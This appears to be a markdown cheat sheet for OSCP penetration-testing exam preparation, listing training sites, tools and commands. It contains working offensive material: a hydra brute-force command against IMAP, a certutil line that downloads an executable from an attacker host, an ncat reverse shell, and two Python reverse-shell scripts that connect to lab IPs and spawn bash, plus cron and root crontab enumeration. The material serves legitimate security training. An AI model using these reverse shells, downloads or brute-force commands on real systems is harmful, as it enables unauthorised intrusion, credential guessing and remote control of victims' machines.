## Useful Websites
[offical exam guide](https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) <br>
[offical exam report](https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf) <br>
[pentest.ws](https://pentest.ws): note taking <br>
[Burp Suite](https://portswigger.net/burp): tool for exploring web security. [Configure browser with Burp Suite](https://www.youtube.com/results?search_query=Configure+with+Burp+Suite) <br>
[OWASP juice box](https://owasp.org/www-project-juice-shop/): OWASP security trainings<br>
[hack this site]<br>
[over the wire]<br>
[pwnable.kr/xyz]<br>
[hack the box]<br>
[cybrary]<br>
[google gruyeye]<br>
[game of hacks]<br>
[bWAPP]<br>
[Webgoat]<br>
[hashcat](https://hashcat.net/wiki/doku.php?id=hashcat): password recovery tool<br>
[feroxbuster](https://github.com/epi052/feroxbuster): powerful forced browsing tool (gobuster、dirb)<br>
[AutoRecon](https://github.com/Tib3rius/AutoRecon): multi-threaded network reconnaissance tool which performs automated enumeration of services<br>
[explainshell](https://explainshell.com/): explain command-line<br>
[SecLists](https://github.com/danielmiessler/SecLists): It's a collection of multiple types of lists used during security assessments, collected in one place

## :warning: Exam Restrictions

[linPEAS](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/): Understanding the tools/scripts you use in a Pentest

## :hammer_and_wrench: Commands

### :open_file_folder: hydra

#### IMAP
```
hydra -L usernames.txt -P wordlists.txt -s 143 -f 192.168.0.1 imap
```
### :open_file_folder: cewl

```
cewl -d 4 https://192.168.0.1 -w /tmp/wordlists.txt
```

### :open_file_folder: download

#### windows

```
certutil -f -urlcache http://192.168.49.220:8000//veyon-service.exe veyon-service.exe
```
### :open_file_folder: nmap

```
nmap -T5 192.168.10.0/24
```

```
nmap -Pn -p- -sC -sV -T4 192.168.201.159 
```
### :open_file_folder: reverse shell

ncat 
```
ncat -e /bin/bash 192.168.10.58 8080
```

python3(file)
```
#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.49.130",80)) 
dup2(s.fileno(),0) 
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/bash","-i"])
```

python(file)
```
#!/usr/bin/env python
import os
import sys
try: 
        os.system("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.112\",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'") 
except: 
        print 'ERROR...' 
sys.exit(0) 
```
### :open_file_folder: Cron jobs

```
crontab -l
```
```
ls -alh /etc/cron.* /etc/at*
```
```
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

> :open_file_folder: unprivileged Linux process snooping: ![pspy](https://github.com/DominicBreuker/pspy)
